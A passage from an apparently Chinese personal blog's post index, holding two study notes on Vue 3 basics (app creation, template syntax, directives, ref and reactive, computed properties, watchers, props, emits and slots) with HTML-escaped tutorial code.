code quality? … No / Yes✔ Add Prettier for code formatting? … No / YesScaffolding project in ./&lt;your-project-name&gt;...Done. 启动 123cd &lt;your-project-name&gt;npm installnpm run dev 2 创建一个应用每个 Vue 应用都是通过 [createApp](https://cn.vuejs.org/api/application.html#createapp) 函数创建一个新的 应用实例： 12345import &#123; createApp &#125; from &#x27;vue&#x27;const app = createApp(&#123; /* 根组件选项 */&#125;) 根组件我们传入 createApp 的对象实际上是一个组件，每个应用都需要一个“根组件”，其他组件将作为其子组件。 如果你使用的是单文件组件，我们可以直接从另一个文件中导入根组件。 12345import &#123; createApp &#125; from &#x27;vue&#x27;// 从一个单文件组件中导入根组件import App from &#x27;./App.vue&#x27;const app = createApp(App) 挂在应用应用实例必须在调用了 .mount() 方法后才会渲染出来。该方法接收一个“容器”参数，可以是一个实际的 DOM 元素或是一个 CSS 选择器字符串： 1&lt;div id=&quot;app&quot;&gt;&lt;/div&gt; 1app.mount(&#x27;#app&#x27;) 应用根组件的内容将会被渲染在容器元素里面。容器元素自己将不会被视为应用的一部分。 .mount() 方法应该始终在整个应用配置和资源注册完成后被调用。同时请注意，不同于其他资源注册方法，它的返回值是根组件实例而非应用实例。 DOM 中的根组件模板根组件的模板通常是组件本身的一部分，但也可以直接通过在挂载容器内编写模板来单独提供： 123&lt;div id=&quot;app&quot;&gt; &lt;button @click=&quot;count++&quot;&gt;&#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/div&gt; 1234567891011import &#123; createApp &#125; from &#x27;vue&#x27;const app = createApp(&#123; data() &#123; return &#123; count: 0 &#125; &#125;&#125;)app.mount(&#x27;#app&#x27;) 当根组件没有设置 template 选项时，Vue 将自动使用容器的 innerHTML 作为模板。 DOM 内模板通常用于无构建步骤的 Vue 应用程序。它们也可以与服务器端框架一起使用，其中根模板可能是由服务器动态生成的。 回到我们创建的实例找到src&#x2F;main.js文件 源代码是这样的 1createApp(App).mount(&#x27;#app&#x27;) 我们可以按照上面的形式改成这样 123456789//根组件const app = createApp(App,&#123; data() &#123; return &#123; count: 0 &#125; &#125; &#125;) app.mount(&#x27;#app&#x27;)//挂载 3 模板语法Vue 使用一种基于 HTML 的模板语法，使我们能够声明式地将其组件实例的数据绑定到呈现的 DOM 上。所有的 Vue 模板都是语法层面合法的 HTML，可以被符合规范的浏览器和 HTML 解析器解析。 在底层机制中，Vue 会将模板编译成高度优化的 JavaScript 代码。结合响应式系统，当应用状态变更时，Vue 能够智能地推导出需要重新渲染的组件的最少数量，并应用最少的 DOM 操作。 如果你对虚拟 DOM 的概念比较熟悉，并且偏好直接使用 JavaScript，你也可以结合可选的 JSX 支持直接手写渲染函数而不采用模板。但请注意，这将不会享受到和模板同等级别的编译时优化。 a.Attribute 绑定双大括号不能在 HTML attributes 中使用。想要响应式地绑定一个 attribute，应该使用 v-bind 指令： 1&lt;div v-bind:id=&quot;dynamicId&quot;&gt;&lt;/div&gt; v-bind 指令指示 Vue 将元素的 id attribute 与组件的 dynamicId 属性保持一致。如果绑定的值是 null 或者 undefined，那么该 attribute 将会从渲染的元素上移除。 因为 v-bind 非常常用，我们提供了特定的简写语法 1&lt;div :id=&quot;dynamicId&quot;&gt;&lt;/div&gt; 动态绑定多个值 如果你有像这样的一个包含多个 attribute 的 JavaScript 对象： 1234const objectOfAttrs = &#123; id: &#x27;container&#x27;, class: &#x27;wrapper&#x27;&#125; 通过不带参数的 v-bind，你可以将它们绑定到单个元素上： 1&lt;div v-bind=&quot;objectOfAttrs&quot;&gt;&lt;/div&gt; b 使用 JavaScript 表达式至此，我们仅在模板中绑定了一些简单的属性名。但是 Vue 实际上在所有的数据绑定中都支持完整的 JavaScript 表达式： 1234567&#123;&#123; number + 1 &#125;&#125;&#123;&#123; ok ? &#x27;YES&#x27; : &#x27;NO&#x27; &#125;&#125;&#123;&#123; message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;) &#125;&#125;&lt;div :id=&quot;`list-$&#123;id&#125;`&quot;&gt;&lt;/div&gt; 在 Vue 模板内，JavaScript 表达式可以被使用在如下场景上： 在文本插值中 (双大括号) 在任何 Vue 指令 (以 v- 开头的特殊 attribute) attribute 的值中 c.指令 Directives指令是带有 v- 前缀的特殊 attribute。Vue 提供了许多**内置指令**，包括上面我们所介绍的 v-bind 和 v-html。 指令 attribute 的期望值为一个 JavaScript 表达式 (除了少数几个例外，即之后要讨论到的 v-for、v-on 和 v-slot)。一个指令的任务是在其表达式的值变化时响应式地更新 DOM。以 [v-if](https://cn.vuejs.org/api/built-in-directives.html#v-if) 为例： 1&lt;p v-if=&quot;seen&quot;&gt;Now you see me&lt;/p&gt; 这里，v-if 指令会基于表达式 seen 的值的真假来移除&#x2F;插入该 &lt;p&gt; 元素。 另一个例子是 v-on 指令，它将监听 DOM 事件： 1234&lt;a v-on:click=&quot;doSomething&quot;&gt; ... &lt;/a&gt;&lt;!-- 简写 --&gt;&lt;a @click=&quot;doSomething&quot;&gt; ... &lt;/a&gt; 这里的参数是要监听的事件名称：click。v-on 有一个相应的缩写，即 @ 字符。我们之后也会讨论关于事件处理的更多细节。 d.动态参数同样在指令参数上也可以使用一个 JavaScript 表达式，需要包含在一对方括号内： 12345678&lt;!--注意，参数表达式有一些约束，参见下面“动态参数值的限制”与“动态参数语法的限制”章节的解释--&gt;&lt;a v-bind:[attributeName]=&quot;url&quot;&gt; ... &lt;/a&gt;&lt;!-- 简写 --&gt;&lt;a :[attributeName]=&quot;url&quot;&gt; ... &lt;/a&gt; 这里的 attributeName 会作为一个 JavaScript 表达式被动态执行，计算得到的值会被用作最终的参数。举例来说，如果你的组件实例有一个数据属性 attributeName，其值为 &quot;href&quot;，那么这个绑定就等价于 v-bind:href。 相似地，你还可以将一个函数绑定到动态的事件名称上： 1234&lt;a v-on:[eventName]=&quot;doSomething&quot;&gt; ... &lt;/a&gt;&lt;!-- 简写 --&gt;&lt;a @[eventName]=&quot;doSomething&quot;&gt; ... &lt;/a&gt; e.修饰符 Modifiers修饰符是以点开头的特殊后缀，表明指令需要以一些特殊的方式被绑定。例如 .prevent 修饰符会告知 v-on 指令对触发的事件调用 event.preventDefault()： 1&lt;form @submit.prevent=&quot;onSubmit&quot;&gt;...&lt;/form&gt; 之后在讲到 [v-on](https://cn.vuejs.org/guide/essentials/event-handling.html#event-modifiers) 和 [v-model](https://cn.vuejs.org/guide/essentials/forms.html#modifiers) 的功能时，你将会看到其他修饰符的例子。 最后，在这里你可以直观地看到完整的指令语法： 4.声明响应式状态a.ref()在组合式 API 中，推荐使用 [ref()](https://cn.vuejs.org/api/reactivity-core.html#ref) 函数来声明响应式状态： 12import &#123; ref &#125; from &#x27;vue&#x27;const count = ref(0) ref() 接收参数，并将其包裹在一个带有 .value 属性的 ref 对象中返回： 12345const count = ref(0)console.log(count) // &#123; value: 0 &#125;console.log(count.value) // 0count.value++console.log(count.value) // 1 要在组件模板中访问 ref，请从组件的 setup() 函数中声明并返回它们： 1234567891011import &#123; ref &#125; from &#x27;vue&#x27;export default &#123; // `setup` 是一个特殊的钩子，专门用于组合式 API。 setup() &#123; const count = ref(0) // 将 ref 暴露给模板 return &#123; count &#125; &#125;&#125; 1&lt;div&gt;&#123;&#123; count &#125;&#125;&lt;/div&gt; 注意，在模板中使用 ref 时，我们不需要附加 .value。为了方便起见，当在模板中使用时，ref 会自动解包 (有一些**注意事项**)。 你也可以直接在事件监听器中改变一个 ref： 123&lt;button @click=&quot;count++&quot;&gt; &#123;&#123; count &#125;&#125;&lt;/button&gt; 对于更复杂的逻辑，我们可以在同一作用域内声明更改 ref 的函数，并将它们作为方法与状态一起公开： 123456789101112131415161718import &#123; ref &#125; from &#x27;vue&#x27;export default &#123; setup() &#123; const count = ref(0) function increment() &#123; // 在 JavaScript 中需要 .value count.value++ &#125; // 不要忘记同时暴露 increment 函数 return &#123; count, increment &#125; &#125;&#125; 然后，暴露的方法可以被用作事件监听器： 123&lt;button @click=&quot;increment&quot;&gt; &#123;&#123; count &#125;&#125;&lt;/button&gt; b**&lt;script setup&gt;**在 setup() 函数中手动暴露大量的状态和方法非常繁琐。幸运的是，我们可以通过使用单文件组件 (SFC) 来避免这种情况。我们可以使用 &lt;script setup&gt; 来大幅度地简化代码： 123456789101112131415&lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;const count = ref(0)function increment() &#123; count.value++&#125;&lt;/script&gt;&lt;template&gt; &lt;button @click=&quot;increment&quot;&gt; &#123;&#123; count &#125;&#125; &lt;/button&gt;&lt;/template&gt; &lt;script setup&gt; 中的顶层的导入、声明的变量和函数可在同一组件的模板中直接使用。你可以理解为模板是在同一作用域内声明的一个 JavaScript 函数——它自然可以访问与它一起声明的所有内容。 c**reactive()**还有另一种声明响应式状态的方式，即使用 reactive() API。与将内部值包装在特殊对象中的 ref 不同，reactive() 将使对象本身具有响应性： 12import &#123; reactive &#125; from &#x27;vue&#x27;const state = reactive(&#123; count: 0 &#125;) 在模板中使用： 123&lt;button @click=&quot;state.count++&quot;&gt; &#123;&#123; state.count &#125;&#125;&lt;/button&gt; 响应式对象是 JavaScript 代理，其行为就和普通对象一样。不同的是，Vue 能够拦截对响应式对象所有属性的访问和修改，以便进行依赖追踪和触发更新。 reactive() 将深层地转换对象：当访问嵌套对象时，它们也会被 reactive() 包装。当 ref 的值是一个对象时，ref() 也会在内部调用它。与浅层 ref 类似，这里也有一个 shallowReactive() API 可以选择退出深层响应性。 Reactive Proxy vs. Original 值得注意的是，reactive() 返回的是一个原始对象的 **Proxy**，它和原始对象是不相等的：（因为一个是对象一个是{}） 1234const raw = &#123;&#125;const proxy = reactive(raw)// 代理对象和原始对象不是全等的console.log(proxy === raw) // false reactive() 的局限性 有限的值类型：它只能用于对象类型 (对象、数组和如 Map、Set 这样的**集合类型)。它不能持有如 string、number 或 boolean 这样的原始类型**。 不能替换整个对象：由于 Vue 的响应式跟踪是通过属性访问实现的，因此我们必须始终保持对响应式对象的相同引用。这意味着我们不能轻易地“替换”响应式对象，因为这样的话与第一个引用的响应性连接将丢失： 12345let state = reactive(&#123; count: 0 &#125;)// 上面的 (&#123; count: 0 &#125;) 引用将不再被追踪// (响应性连接已丢失！)state = reactive(&#123; count: 1 &#125;) 对解构操作不友好：当我们将响应式对象的原始类型属性解构为本地变量时，或者将该属性传递给函数时，我们将丢失响应性连接： 1234567891011const state = reactive(&#123; count: 0 &#125;)// 当解构时，count 已经与 state.count 断开连接let &#123; count &#125; = state// 不会影响原始的 statecount++// 该函数接收到的是一个普通的数字// 并且无法追踪 state.count 的变化// 我们必须传入整个对象以保持响应性callSomeFunction(state.count) 由于这些限制，我们建议使用 ref() 作为声明响应式状态的主要 API。 5.计算属性a.基础示例模板中的表达式虽然方便，但也只能用来做简单的操作。如果在模板中写太多逻辑，会让模板变得臃肿，难以维护。比如说，我们有这样一个包含嵌套数组的对象： 12345678const author = reactive(&#123; name: &#x27;John Doe&#x27;, books: [ &#x27;Vue 2 - Advanced Guide&#x27;, &#x27;Vue 3 - Basic Guide&#x27;, &#x27;Vue 4 - The Mystery&#x27; ]&#125;) 我们想根据 author 是否已有一些书籍来展示不同的信息： 12&lt;p&gt;Has published books:&lt;/p&gt;&lt;span&gt;&#123;&#123; author.books.length &gt; 0 ? &#x27;Yes&#x27; : &#x27;No&#x27; &#125;&#125;&lt;/span&gt; 这里的模板看起来有些复杂。我们必须认真看好一会儿才能明白它的计算依赖于 author.books。更重要的是，如果在模板中需要不止一次这样的计算，我们可不想将这样的代码在模板里重复好多遍。 因此我们推荐使用计算属性来描述依赖响应式状态的复杂逻辑。这是重构后的示例： 12345678910111213141516171819202122&lt;script setup&gt;import &#123; reactive, computed &#125; from &#x27;vue&#x27;const author = reactive(&#123; name: &#x27;John Doe&#x27;, books: [ &#x27;Vue 2 - Advanced Guide&#x27;, &#x27;Vue 3 - Basic Guide&#x27;, &#x27;Vue 4 - The Mystery&#x27; ]&#125;)// 一个计算属性 refconst publishedBooksMessage = computed(() =&gt; &#123; return author.books.length &gt; 0 ? &#x27;Yes&#x27; : &#x27;No&#x27;&#125;)&lt;/script&gt;&lt;template&gt; &lt;p&gt;Has published books:&lt;/p&gt; &lt;span&gt;&#123;&#123; publishedBooksMessage &#125;&#125;&lt;/span&gt;&lt;/template&gt; 我们在这里定义了一个计算属性 publishedBooksMessage。computed() 方法期望接收一个 getter 函数，返回值为一个计算属性 ref。和其他一般的 ref 类似，你可以通过 publishedBooksMessage.value 访问计算结果。计算属性 ref 也会在模板中自动解包，因此在模板表达式中引用时无需添加 .value。 Vue 的计算属性会自动追踪响应式依赖。它会检测到 publishedBooksMessage 依赖于 author.books，所以当 author.books 改变时，任何依赖于 publishedBooksMessage 的绑定都会同时更新。 b.计算属性缓存 vs 方法你可能注意到我们在表达式中像这样调用一个函数也会获得和计算属性相同的结果： 1&lt;p&gt;&#123;&#123; calculateBooksMessage() &#125;&#125;&lt;/p&gt; 1234// 组件中function calculateBooksMessage() &#123; return author.books.length &gt; 0 ? &#x27;Yes&#x27; : &#x27;No&#x27;&#125; 若我们将同样的函数定义为一个方法而不是计算属性，两种方式在结果上确实是完全相同的，然而，不同之处在于计算属性值会基于其响应式依赖被缓存。一个计算属性仅会在其响应式依赖更新时才重新计算。这意味着只要 author.books 不改变，无论多少次访问 publishedBooksMessage 都会立即返回先前的计算结果，而不用重复执行 getter 函数。 这也解释了为什么下面的计算属性永远不会更新，因为 Date.now() 并不是一个响应式依赖： 1const now = computed(() =&gt; Date.now()) 相比之下，方法调用总是会在重渲染发生时再次执行函数。 为什么需要缓存呢？想象一下我们有一个非常耗性能的计算属性 list，需要循环一个巨大的数组并做许多计算逻辑，并且可能也有其他计算属性依赖于 list。没有缓存的话，我们会重复执行非常多次 list 的 getter，然而这实际上没有必要！如果你确定不需要缓存，那么也可以使用方法调用。 c.可写计算属性计算属性默认是只读的。当你尝试修改一个计算属性时，你会收到一个运行时警告。只在某些特殊场景中你可能才需要用到“可写”的属性，你可以通过同时提供 getter 和 setter 来创建： 123456789101112131415161718&lt;script setup&gt;import &#123; ref, computed &#125; from &#x27;vue&#x27;const firstName = ref(&#x27;John&#x27;)const lastName = ref(&#x27;Doe&#x27;)const fullName = computed(&#123; // getter get() &#123; return firstName.value + &#x27; &#x27; + lastName.value &#125;, // setter set(newValue) &#123; // 注意：我们这里使用的是解构赋值语法 [firstName.value, lastName.value] = newValue.split(&#x27; &#x27;) &#125;&#125;)&lt;/script&gt; 现在当你再运行 fullName.value = &#39;John Doe&#39; 时，setter 会被调用而 firstName 和 lastName 会随之更新。 soga好神奇 今天学到这里，下课！","categories":[{"name":"前端学习","slug":"前端学习","permalink":"https://snowman12137.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"前端学习,VUE","slug":"前端学习-VUE","permalink":"https://snowman12137.github.io/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0-VUE/"}],"author":"Sn0wma1n"},{"title":"VUE学习(一)","slug":"VUE学习-一-62f62110128e4885b6e51feca4bc7f6e","date":"2024-02-02T16:00:00.000Z","updated":"2024-02-06T18:24:04.967Z","comments":true,"path":"2024/02/03/VUE学习-一-62f62110128e4885b6e51feca4bc7f6e/","link":"","permalink":"https://snowman12137.github.io/2024/02/03/VUE%E5%AD%A6%E4%B9%A0-%E4%B8%80-62f62110128e4885b6e51feca4bc7f6e/","excerpt":"","text":"VUE学习(一)教程来自https://cn.vuejs.org/tutorial https://cn.vuejs.org/guide/essentials/application.html 1.创建一个VUE应用1npm create vue@latest 然后安装依赖并启动服务器 123cd &lt;your-project-name&gt;npm installnpm run dev install页面卡了很久，应该是没换源 123456// 配置nmp代理来提高速度，如设置淘宝镜像npm config set registry https://registry.npm.taobao.org // 查看配置是否成功npm config get registry // 成功后重新npm install安装npm install 2.声明式渲染你在编辑器中看到的是一个 Vue 单文件组件 (Single-File Component，缩写为 SFC)。SFC 是一种可复用的代码组织形式，它将从属于同一个组件的 HTML、CSS 和 JavaScript 封装在使用 .vue 后缀的文件中。 Vue 的核心功能是声明式渲染：通过扩展于标准 HTML 的模板语法，我们可以根据 JavaScript 的状态来描述 HTML 应该是什么样子的。当状态改变时，HTML 会自动更新。 能在改变时触发更新的状态被称作是响应式的。我们可以使用 Vue 的 reactive() API 来声明响应式状态。由 reactive() 创建的对象都是 JavaScript **Proxy**，其行为与普通对象一样： 123456import &#123; reactive &#125; from &#x27;vue&#x27;const counter = reactive(&#123; count: 0&#125;)console.log(counter.count) // 0counter.count++ reactive() 只适用于对象 (包括数组和内置类型，如 Map 和 Set)。而另一个 API ref() 则可以接受任何值类型。ref 会返回一个包裹对象，并在 .value 属性下暴露内部值。 1234import &#123; ref &#125; from &#x27;vue&#x27;const message = ref(&#x27;Hello World!&#x27;)console.log(message.value) // &quot;Hello World!&quot;message.value = &#x27;Changed&#x27; 3.Attribute绑定在 Vue 中，mustache 语法 (即双大括号) 只能用于文本插值。为了给 attribute 绑定一个动态值，需要使用 v-bind 指令： 1&lt;div v-bind:id=&quot;dynamicId&quot;&gt;&lt;/div&gt; 其是由 v- 开头的一种特殊 attribute。它们是 Vue 模板语法的一部分。和文本插值类似，指令的值是可以访问组件状态的 JavaScript 表达式。 冒号后面的部分 (:id) 是指令的“参数”。此处，元素的 id attribute 将与组件状态里的 dynamicId 属性保持同步。 由于 v-bind 使用地非常频繁，它有一个专门的简写语法： 1&lt;div :id=&quot;dynamicId&quot;&gt;&lt;/div&gt; 4.事件监听我们可以使用 v-on 指令监听 DOM 事件： 1&lt;button v-on:click=&quot;increment&quot;&gt;&#123;&#123; count &#125;&#125;&lt;/button&gt; 因为其经常使用，v-on 也有一个简写语法： 1&lt;button @click=&quot;increment&quot;&gt;&#123;&#123; count &#125;&#125;&lt;/button&gt; 此处，increment 引用了一个在 &lt;script setup&gt; 中声明的函数： 12345678&lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;const count = ref(0)function increment() &#123; // 更新组件状态 count.value++&#125;&lt;/script&gt; 在函数中，我们可以通过修改 ref 来更新组件状态。 5.表单绑定我们可以同时使用 v-bind 和 v-on 来在表单的输入元素上创建双向绑定： 1&lt;input :value=&quot;text&quot; @input=&quot;onInput&quot;&gt; 12345function onInput(e) &#123; // v-on 处理函数会接收原生 DOM 事件 // 作为其参数。 text.value = e.target.value&#125; 试着在文本框里输入——你会看到 &lt;p&gt; 里的文本也随着你的输入更新了。 为了简化双向绑定，Vue 提供了一个 v-model 指令，它实际上是上述操作的语法糖： 1&lt;input v-model=&quot;text&quot;&gt; v-model 会将被绑定的值与 &lt;input&gt; 的值自动同步，这样我们就不必再使用事件处理函数了。 6.条件渲染我们可以使用 v-if 指令来有条件地渲染元素： 1&lt;h1 v-if=&quot;awesome&quot;&gt;Vue is awesome!&lt;/h1&gt; 这个 &lt;h1&gt; 标签只会在 awesome 的值为真值 (Truthy) 时渲染。若 awesome 更改为**假值 (Falsy)**，它将被从 DOM 中移除。 我们也可以使用 v-else 和 v-else-if 来表示其他的条件分支： 12&lt;h1 v-if=&quot;awesome&quot;&gt;Vue is awesome!&lt;/h1&gt;&lt;h1 v-else&gt;Oh no 😢&lt;/h1&gt; 现在，示例程序同时展示了两个 &lt;h1&gt; 标签，并且按钮不执行任何操作。尝试给它们添加 v-if 和 v-else 指令，并实现 toggle() 方法，让我们可以使用按钮在它们之间切换。 7.列表渲染我们可以使用 v-for 指令来渲染一个基于源数组的列表： 12345&lt;ul&gt; &lt;li v-for=&quot;todo in todos&quot; :key=&quot;todo.id&quot;&gt; &#123;&#123; todo.text &#125;&#125; &lt;/li&gt;&lt;/ul&gt; 这里的 todo 是一个局部变量，表示当前正在迭代的数组元素。它只能在 v-for 所绑定的元素上或是其内部访问，就像函数的作用域一样。 注意，我们还给每个 todo 对象设置了唯一的 id，并且将它作为特殊的 [key attribute](https://cn.vuejs.org/api/built-in-special-attributes.html#key) 绑定到每个 &lt;li&gt;。key 使得 Vue 能够精确的移动每个 &lt;li&gt;，以匹配对应的对象在数组中的位置。 更新列表有两种方式： 在源数组上调用变更方法： 1todos.value.push(newTodo) 2.使用新的数组替代原数组： 1todos.value = todos.value.filter(/* ... */) 对以下函数进行解析 v-modle-&gt;:+@表单绑定 v-on-&gt;@事件监听 1234567891011121314151617181920212223242526272829303132&lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;// 给每个 todo 对象一个唯一的 idlet id = 0const newTodo = ref(&#x27;&#x27;) //创建对象const todos = ref([ //创建数组 &#123; id: id++, text: &#x27;Learn HTML&#x27; &#125;, &#123; id: id++, text: &#x27;Learn JavaScript&#x27; &#125;, &#123; id: id++, text: &#x27;Learn Vue&#x27; &#125;])function addTodo() &#123;//添加函数 todos.value.push(&#123; id: id++, text: newTodo.value &#125;) newTodo.value = &#x27;&#x27;&#125;function removeTodo(todo) &#123;//移除函数//filter是JavaScript数组中自带的方法，当返回值为真是，返回；并且不改变原数组//()=&gt;是箭头函数，这是所用的形式是(param) =&gt; expression todos.value = todos.value.filter((t) =&gt; t !== todo)&#125;&lt;/script&gt;&lt;template&gt; &lt;form @submit.prevent=&quot;addTodo&quot;&gt;//对addTodo进行绑定，.prevent表示阻止表单的默认提交行为 &lt;input v-model=&quot;newTodo&quot;&gt; //绑定表单newTodo &lt;button&gt;Add Todo&lt;/button&gt; &lt;/form&gt; &lt;ul&gt; &lt;li v-for=&quot;todo in todos&quot; :key=&quot;todo.id&quot;&gt;//进行列表渲染 &#123;&#123; todo.text &#125;&#125; &lt;button @click=&quot;removeTodo(todo)&quot;&gt;X&lt;/button&gt;//清除动作 &lt;/li&gt; &lt;/ul&gt;&lt;/template&gt; 8.计算属性让我们在上一步的 todo 列表基础上继续。现在，我们已经给每一个 todo 添加了切换功能。这是通过给每一个 todo 对象添加 done 属性来实现的，并且使用了 v-model 将其绑定到复选框上： 1234&lt;li v-for=&quot;todo in todos&quot;&gt; &lt;input type=&quot;checkbox&quot; v-model=&quot;todo.done&quot;&gt; ...&lt;/li&gt; 下一个可以添加的改进是隐藏已经完成的 todo。我们已经有了一个能够切换 hideCompleted 状态的按钮。但是应该如何基于状态渲染不同的列表项呢？ 介绍一个新 API：**[computed()](https://cn.vuejs.org/guide/essentials/computed.html)**。它可以让我们创建一个计算属性 ref，这个 ref 会动态地根据其他响应式数据源来计算其 .value： 123456789101112131415161718192021222324252627282930313233343536373839&lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;let id = 0const newTodo = ref(&#x27;&#x27;)const hideCompleted = ref(false)const todos = ref([ &#123; id: id++, text: &#x27;Learn HTML&#x27;, done: true &#125;, &#123; id: id++, text: &#x27;Learn JavaScript&#x27;, done: true &#125;, &#123; id: id++, text: &#x27;Learn Vue&#x27;, done: false &#125;])function addTodo() &#123; todos.value.push(&#123; id: id++, text: newTodo.value, done: false &#125;) newTodo.value = &#x27;&#x27;&#125;function removeTodo(todo) &#123; todos.value = todos.value.filter((t) =&gt; t !== todo)&#125;&lt;/script&gt;&lt;template&gt; &lt;form @submit.prevent=&quot;addTodo&quot;&gt; &lt;input v-model=&quot;newTodo&quot;&gt; &lt;button&gt;Add Todo&lt;/button&gt; &lt;/form&gt; &lt;ul&gt; &lt;li v-for=&quot;todo in todos&quot; :key=&quot;todo.id&quot;&gt; &lt;input type=&quot;checkbox&quot; v-model=&quot;todo.done&quot;&gt; &lt;span :class=&quot;&#123; done: todo.done &#125;&quot;&gt;&#123;&#123; todo.text &#125;&#125;&lt;/span&gt; &lt;button @click=&quot;removeTodo(todo)&quot;&gt;X&lt;/button&gt; &lt;/li&gt; &lt;/ul&gt; &lt;button @click=&quot;hideCompleted = !hideCompleted&quot;&gt; &#123;&#123; hideCompleted ? &#x27;Show all&#x27; : &#x27;Hide completed&#x27; &#125;&#125; &lt;/button&gt;&lt;/template&gt;&lt;style&gt;.done &#123; text-decoration: line-through;&#125;&lt;/style&gt; 计算属性会自动跟踪其计算中所使用的到的其他响应式状态，并将它们收集为自己的依赖。计算结果会被缓存，并只有在其依赖发生改变时才会被自动更新。 9.生命周期和模板引用目前为止，Vue 为我们处理了所有的 DOM 更新，这要归功于响应性和声明式渲染。然而，有时我们也会不可避免地需要手动操作 DOM。 这时我们需要使用模板引用——也就是指向模板中一个 DOM 元素的 ref。我们需要通过这个特殊的 [ref](https://cn.vuejs.org/api/built-in-special-attributes.html#ref) attribute 来实现模板引用： 1&lt;p ref=&quot;pElementRef&quot;&gt;hello&lt;/p&gt; 要访问该引用，我们需要声明一个同名的 ref： 1const pElementRef = ref(null) 注意这个 ref 使用 null 值来初始化。这是因为当 &lt;script setup&gt; 执行时，DOM 元素还不存在。模板引用 ref 只能在组件挂载后访问。 要在挂载之后执行代码，我们可以使用 onMounted() 函数： 12345import &#123; onMounted &#125; from &#x27;vue&#x27;onMounted(() =&gt; &#123; // 此时组件已经挂载。&#125;) 这被称为生命周期钩子——它允许我们注册一个在组件的特定生命周期调用的回调函数。还有一些其他的钩子如 onUpdated 和 onUnmounted。 10侦听器有时我们需要响应性地执行一些“副作用”——例如，当一个数字改变时将其输出到控制台。我们可以通过侦听器来实现它： 12345678import &#123; ref, watch &#125; from &#x27;vue&#x27;const count = ref(0)watch(count, (newCount) =&gt; &#123; // 没错，console.log() 是一个副作用 console.log(`new count is: $&#123;newCount&#125;`)&#125;) watch() 可以直接侦听一个 ref，并且只要 count 的值改变就会触发回调。watch() 也可以侦听其他类型的数据源。 一个比在控制台输出更加实际的例子是当 ID 改变时抓取新的数据。在右边的例子中就是这样一个组件。该组件被挂载时，会从模拟 API 中抓取 todo 数据，同时还有一个按钮可以改变要抓取的 todo 的 ID。现在，尝试实现一个侦听器，使得组件能够在按钮被点击时抓取新的 todo 项目。 1234567891011121314151617181920212223&lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;const todoId = ref(1)const todoData = ref(null)async function fetchData() &#123; todoData.value = null const res = await fetch( `https://jsonplaceholder.typicode.com/todos/$&#123;todoId.value&#125;` ) todoData.value = await res.json()&#125;fetchData()&lt;/script&gt;&lt;template&gt; &lt;p&gt;Todo id: &#123;&#123; todoId &#125;&#125;&lt;/p&gt; &lt;button @click=&quot;todoId++&quot; :disabled=&quot;!todoData&quot;&gt;Fetch next todo&lt;/button&gt; &lt;p v-if=&quot;!todoData&quot;&gt;Loading...&lt;/p&gt; &lt;pre v-else&gt;&#123;&#123; todoData &#125;&#125;&lt;/pre&gt;&lt;/template&gt; 11组件目前为止，我们只使用了单个组件。真正的 Vue 应用往往是由嵌套组件创建的。 父组件可以在模板中渲染另一个组件作为子组件。要使用子组件，我们需要先导入它： 1import ChildComp from &#x27;./ChildComp.vue&#x27; 然后我们就可以在模板中使用组件，就像这样： 1&lt;ChildComp /&gt; 12 Props子组件可以通过 props 从父组件接受动态数据。首先，需要声明它所接受的 props： 123456&lt;!-- ChildComp.vue --&gt;&lt;script setup&gt;const props = defineProps(&#123; msg: String&#125;)&lt;/script&gt; 注意 defineProps() 是一个编译时宏，并不需要导入。一旦声明，msg prop 就可以在子组件的模板中使用。它也可以通过 defineProps() 所返回的对象在 JavaScript 中访问。 父组件可以像声明 HTML attributes 一样传递 props。若要传递动态值，也可以使用 v-bind 语法： 1&lt;ChildComp :msg=&quot;greeting&quot; /&gt; 12345678910&lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;import ChildComp from &#x27;./ChildComp.vue&#x27;const greeting = ref(&#x27;Hello from parent&#x27;)&lt;/script&gt;&lt;template&gt; &lt;ChildComp :msg=&quot;greeting&quot; /&gt;&lt;/template&gt; 13 Emits除了接收 props，子组件还可以向父组件触发事件： 1234567&lt;script setup&gt;// 声明触发的事件const emit = defineEmits([&#x27;response&#x27;])// 带参数触发emit(&#x27;response&#x27;, &#x27;hello from child&#x27;)&lt;/script&gt; emit() 的第一个参数是事件的名称。其他所有参数都将传递给事件监听器。 父组件可以使用 v-on 监听子组件触发的事件——这里的处理函数接收了子组件触发事件时的额外参数并将它赋值给了本地状态： 1&lt;ChildComp @response=&quot;(msg) =&gt; childMsg = msg&quot; /&gt; 1234567891011&lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;import ChildComp from &#x27;./ChildComp.vue&#x27;const childMsg = ref(&#x27;No child msg yet&#x27;)&lt;/script&gt;&lt;template&gt; &lt;ChildComp @response=&quot;(msg) =&gt; childMsg = msg&quot; /&gt; &lt;p&gt;&#123;&#123; childMsg &#125;&#125;&lt;/p&gt;&lt;/template&gt; 14 插槽除了通过 props 传递数据外，父组件还可以通过插槽 (slots) 将模板片段传递给子组件： 123&lt;ChildComp&gt; This is some slot content!&lt;/ChildComp&gt; 在子组件中，可以使用 &lt;slot&gt; 元素作为插槽出口 (slot outlet) 渲染父组件中的插槽内容 (slot content)： 12&lt;!-- 在子组件的模板中 --&gt;&lt;slot/&gt; &lt;slot&gt; 插口中的内容将被当作“默认”内容：它会在父组件没有传递任何插槽内容时显示： 1&lt;slot&gt;Fallback content&lt;/slot&gt; 现在我们没有给 &lt;ChildComp&gt; 传递任何插槽内容，所以你将看到默认内容。让我们利用父组件的 msg 